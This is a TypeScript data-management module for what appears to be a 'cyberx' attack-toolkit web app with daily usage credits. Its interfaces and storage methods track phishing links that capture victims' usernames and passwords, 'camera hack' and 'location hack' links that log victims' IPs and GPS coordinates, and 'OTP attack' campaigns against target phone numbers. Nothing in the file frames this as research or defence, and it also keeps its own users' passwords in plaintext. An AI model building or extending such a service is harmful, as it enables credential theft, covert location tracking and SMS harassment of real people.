
export interface User {
  id: string;
  name: string;
  phone: string;
  password: string;
  credits: number;
  lastCreditReset: string;
  createdAt: string;
}

export interface UserSession {
  id: string;
  name: string;
  phone: string;
  credits: number;
}

export interface PhishingLink {
  id: string;
  userId: string;
  platform: string;
  url: string;
  clicks: Array<{
    timestamp: string;
    userAgent: string;
    ip: string;
    credentials?: {
      username: string;
      password: string;
    };
  }>;
  createdAt: string;
}

export interface CameraHackLink {
  id: string;
  userId: string;
  url: string;
  captures: Array<{
    timestamp: string;
    userAgent: string;
    ip: string;
  }>;
  createdAt: string;
}

export interface LocationHackLink {
  id: string;
  userId: string;
  url: string;
  locations: Array<{
    timestamp: string;
    latitude: number;
    longitude: number;
    ip: string;
    userAgent: string;
  }>;
  createdAt: string;
}

export interface OTPAttack {
  id: string;
  userId: string;
  targetPhone: string;
  status: 'active' | 'stopped';
  sentCount: number;
  createdAt: string;
}

export class UserDataManager {
  private static USERS_KEY = 'cyberx_users';
  private static SESSION_KEY = 'cyberx_session';
  private static PHISHING_KEY = 'cyberx_phishing';
  private static CAMERA_KEY = 'cyberx_camera';
  private static LOCATION_KEY = 'cyberx_location';
  private static OTP_KEY = 'cyberx_otp';

  static getUsers(): User[] {
    const data = localStorage.getItem(this.USERS_KEY);
    return data ? JSON.parse(data) : [];
  }

  static saveUsers(users: User[]): void {
    localStorage.setItem(this.USERS_KEY, JSON.stringify(users));
  }

  static registerUser(name: string, phone: string, password: string): User {
    const users = this.getUsers();
    
    // Check if phone already exists
    if (users.find(u => u.phone === phone)) {
      throw new Error('Phone number already registered');
    }

    const newUser: User = {
      id: Date.now().toString(),
      name,
      phone,
      password,
      credits: 3,
      lastCreditReset: new Date().toISOString().split('T')[0],
      createdAt: new Date().toISOString()
    };

    users.push(newUser);
    this.saveUsers(users);
    return newUser;
  }

  static loginUser(phone: string, password: string): UserSession {
    const users = this.getUsers();
    const user = users.find(u => u.phone === phone && u.password === password);
    
    if (!user) {
      throw new Error('Invalid credentials');
    }

    // Reset daily credits if needed
    const today = new Date().toISOString().split('T')[0];
    if (user.lastCreditReset !== today) {
      user.credits = 3;
      user.lastCreditReset = today;
      this.saveUsers(users);
    }

    const session: UserSession = {
      id: user.id,
      name: user.name,
      phone: user.phone,
      credits: user.credits
    };

    localStorage.setItem(this.SESSION_KEY, JSON.stringify(session));
    return session;
  }

  static getCurrentUser(): UserSession | null {
    const data = localStorage.getItem(this.SESSION_KEY);
    return data ? JSON.parse(data) : null;
  }

  static logout(): void {
    localStorage.removeItem(this.SESSION_KEY);
  }

  static useCredit(userId: string): boolean {
    const users = this.getUsers();
    const userIndex = users.findIndex(u => u.id === userId);
    
    if (userIndex === -1 || users[userIndex].credits <= 0) {
      return false;
    }

    users[userIndex].credits--;
    this.saveUsers(users);
    
    // Update session
    const session = this.getCurrentUser();
    if (session && session.id === userId) {
      session.credits--;
      localStorage.setItem(this.SESSION_KEY, JSON.stringify(session));
    }
    
    return true;
  }

  static savePhishingLink(link: PhishingLink): void {
    const links = JSON.parse(localStorage.getItem(this.PHISHING_KEY) || '[]');
    links.push(link);
    localStorage.setItem(this.PHISHING_KEY, JSON.stringify(links));
  }

  static getPhishingLinks(userId: string): PhishingLink[] {
    const links = JSON.parse(localStorage.getItem(this.PHISHING_KEY) || '[]');
    return links.filter((link: PhishingLink) => link.userId === userId);
  }

  static saveCameraLink(link: CameraHackLink): void {
    const links = JSON.parse(localStorage.getItem(this.CAMERA_KEY) || '[]');
    links.push(link);
    localStorage.setItem(this.CAMERA_KEY, JSON.stringify(links));
  }

  static getCameraLinks(userId: string): CameraHackLink[] {
    const links = JSON.parse(localStorage.getItem(this.CAMERA_KEY) || '[]');
    return links.filter((link: CameraHackLink) => link.userId === userId);
  }

  static saveLocationLink(link: LocationHackLink): void {
    const links = JSON.parse(localStorage.getItem(this.LOCATION_KEY) || '[]');
    links.push(link);
    localStorage.setItem(this.LOCATION_KEY, JSON.stringify(links));
  }

  static getLocationLinks(userId: string): LocationHackLink[] {
    const links = JSON.parse(localStorage.getItem(this.LOCATION_KEY) || '[]');
    return links.filter((link: LocationHackLink) => link.userId === userId);
  }

  static saveOTPAttack(attack: OTPAttack): void {
    const attacks = JSON.parse(localStorage.getItem(this.OTP_KEY) || '[]');
    attacks.push(attack);
    localStorage.setItem(this.OTP_KEY, JSON.stringify(attacks));
  }

  static getOTPAttacks(userId: string): OTPAttack[] {
    const attacks = JSON.parse(localStorage.getItem(this.OTP_KEY) || '[]');
    return attacks.filter((attack: OTPAttack) => attack.userId === userId);
  }
}
